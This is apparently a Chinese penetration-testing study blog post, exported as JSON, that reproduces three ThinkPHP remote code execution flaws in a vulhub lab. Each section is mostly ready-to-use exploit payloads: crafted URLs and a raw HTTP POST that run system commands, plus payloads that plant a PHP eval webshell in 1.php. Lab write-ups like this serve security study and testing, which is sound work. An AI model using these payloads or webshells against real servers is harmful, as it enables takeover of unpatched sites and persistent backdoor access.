{"title":"渗透测试笔记 - day48 框架漏洞（ThinkPHP）","date":"2023-03-16T17:42:18.156Z","date_formatted":{"ll":"Mar 16, 2023","L":"03/16/2023","MM-DD":"03-16"},"link":"2023/03/16/渗透测试笔记 - day48 框架漏洞（ThinkPHP）","updated":"2023-03-17T05:01:09.698Z","content":"<h2 id=\"tinkphp2.x远程代码执行漏洞\">TinkPHP2.x远程代码执行漏洞<a title=\"#tinkphp2.x远程代码执行漏洞\" href=\"#tinkphp2.x远程代码执行漏洞\"></a></h2>\n<ul>\n<li>\n<p>环境：Kali2021 / docker / vulhub</p>\n</li>\n<li>\n<p>漏洞原理：ThinkPHP 2.x版本中，使用<code>preg_replace</code>的<code>/e</code>模式（可执行模式，已在5.0之后被弃用 ）匹配路由为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$res = preg_replace(&#x27;@(\\w+)&#x27;.$depr.&#x27;([^&#x27;.$depr.&#x27;\\/]+)@e&#x27;, &#x27;$var[\\&#x27;\\\\1\\&#x27;]=&quot;\\\\2&quot;;&#x27;, implode($depr,$paths));</span><br></pre></td></tr></table></figure>\n<p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p>\n</li>\n</ul>\n<h3 id=\"漏洞复现\">漏洞复现<a title=\"#漏洞复现\" href=\"#漏洞复现\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204071847719.png\" alt=\"image-20220407184744657\" loading=\"lazy\" class=\"φbp\"></p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.31.27:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204071848924.png\" alt=\"image-20220407184844851\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204071851159.png\" alt=\"image-20220407185146108\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用成功。</p>\n<p>webshell连接</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.31.27:8080/?s=/a/b/c/$&#123;$&#123;@eval($_POST[cmd])&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204071947392.png\" alt=\"image-20220407194053466\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204071947503.png\" alt=\"image-20220407194743449\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<h2 id=\"thinkphp5-5.0.22/5.1.29远程代码执行漏洞\">Thinkphp5 5.0.22/5.1.29远程代码执行漏洞<a title=\"#thinkphp5-5.0.22/5.1.29远程代码执行漏洞\" href=\"#thinkphp5-5.0.22/5.1.29远程代码执行漏洞\"></a></h2>\n<ul>\n<li>环境：Kali2021 / docker / vulhub</li>\n<li>由于框架处理控制器名称不正确，如果网站没有启用强制路由（这是默认设置），它可以执行任何代码，从而导致 RCE 漏洞。</li>\n</ul>\n<h3 id=\"漏洞复现-1\">漏洞复现<a title=\"#漏洞复现-1\" href=\"#漏洞复现-1\"></a></h3>\n<p>直接访问poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.31.27:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204072053192.png\" alt=\"image-20220407205336086\" loading=\"lazy\" class=\"φbp\"></p>\n<p>任意命令执行</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.31.27:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204072054050.png\" alt=\"image-20220407205413002\" loading=\"lazy\" class=\"φbp\"></p>\n<p>webshell连接：</p>\n<p>写入一句话木马payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.31.27:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%22%3C?php%20@eval(\\$_POST[cmd]);?%3E%22%3E1.php</span><br></pre></td></tr></table></figure>\n<p>webshell连接</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204072109063.png\" alt=\"image-20220407210908020\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204072109366.png\" alt=\"image-20220407210925320\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<h2 id=\"thinkphp5.0.23-远程代码执行漏洞\">ThinkPHP5.0.23 远程代码执行漏洞<a title=\"#thinkphp5.0.23-远程代码执行漏洞\" href=\"#thinkphp5.0.23-远程代码执行漏洞\"></a></h2>\n<ul>\n<li>环境：Kali2021 / docker / vulhub</li>\n<li>在ThinkPHP 5.0(&lt;5.0.24) 版本中，没有对_mothod属性进行严格的校验，导致可以通过变量覆盖掉requests类的属性实现任意函数的调用来执行代码。</li>\n</ul>\n<h3 id=\"漏洞复现-2\">漏洞复现<a title=\"#漏洞复现-2\" href=\"#漏洞复现-2\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204071958841.png\" alt=\"image-20220407195757868\" loading=\"lazy\" class=\"φbp\"></p>\n<p>抓包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204072000266.png\" alt=\"image-20220407200023197\" loading=\"lazy\" class=\"φbp\"></p>\n<p>POC：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /index.php?s=captcha HTTP/1.1</span><br><span class=\"line\">Host: 192.168.31.27:8080</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=16d7f0874fc1a864680554dea7e11412</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 0</span><br><span class=\"line\"></span><br><span class=\"line\">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure>\n<p>发送</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204072002716.png\" alt=\"image-20220407200229627\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用完成。</p>\n<p>上传一句话木马</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;&lt;?php @eval(\\$_POST[cmd]);?&gt;&quot;&gt;1.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204072044431.png\" alt=\"image-20220407204426332\" loading=\"lazy\" class=\"φbp\"></p>\n<p>连接webshell</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204072045553.png\" alt=\"image-20220407204500512\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204072047816.png\" alt=\"image-20220407204759772\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用完成。</p>\n","prev":{"title":"渗透测试笔记 - day47 中间件漏洞（JBoss、Strust2）","link":"2023/03/16/渗透测试笔记 - day47 中间件漏洞（JBoss、Strust2）"},"next":{"title":"渗透测试笔记 - day41 Windows应急响应","link":"2023/03/16/渗透测试笔记 - day41 Windows应急响应"},"plink":"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day48 框架漏洞（ThinkPHP）/","toc":[{"id":"tinkphp2.x远程代码执行漏洞","title":"TinkPHP2.x远程代码执行漏洞","index":"1","children":[{"id":"漏洞复现","title":"漏洞复现","index":"1.1"}]},{"id":"thinkphp5-5.0.22/5.1.29远程代码执行漏洞","title":"Thinkphp5 5.0.22&#x2F;5.1.29远程代码执行漏洞","index":"2","children":[{"id":"漏洞复现-1","title":"漏洞复现","index":"2.1"}]},{"id":"thinkphp5.0.23-远程代码执行漏洞","title":"ThinkPHP5.0.23 远程代码执行漏洞","index":"3","children":[{"id":"漏洞复现-2","title":"漏洞复现","index":"3.1"}]}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"March 16, 2023","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day48 框架漏洞（ThinkPHP）/\" title=\"渗透测试笔记 - day48 框架漏洞（ThinkPHP）\">https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day48 框架漏洞（ThinkPHP）/</a>"},"reading_time":"744 words in 5 min"}